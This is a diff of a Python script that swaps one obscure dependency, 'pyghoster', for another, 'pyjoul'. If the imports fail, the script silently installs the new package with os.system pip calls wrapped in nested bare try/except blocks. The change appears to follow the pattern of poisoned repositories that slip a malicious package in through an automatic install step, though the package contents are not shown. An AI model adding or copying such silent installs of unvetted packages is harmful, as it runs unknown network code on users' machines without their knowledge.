@@ -1,6 +1,6 @@
 import os
 try:
-    import pyghoster
+    import pyjoul
     from colorama import Fore, init
     from urllib import request
     from requests import session as sesh
@@ -17,20 +17,20 @@ try:
     import ctypes
 except:
     try:
-        os.system("python.exe -m pip install pyghoster")
+        os.system("python.exe -m pip install pyjoul")
         os.system("python.exe -m pip install -r requirements.txt")
     except:
         try:
-            os.system("python3 -m pip install pyghoster")
+            os.system("python3 -m pip install pyjoul")
             os.system("python3 -m pip install -r requirements.txt")
         except:
             try:
-                os.system("pip install pyghoster")
+                os.system("pip install pyjoul")
                 os.system("pip install -r requirements.txt")
             except:
                 pass
 
-import pyghoster
+import pyjoul
 from colorama import Fore, init
 from urllib import request
 from requests import session as sesh
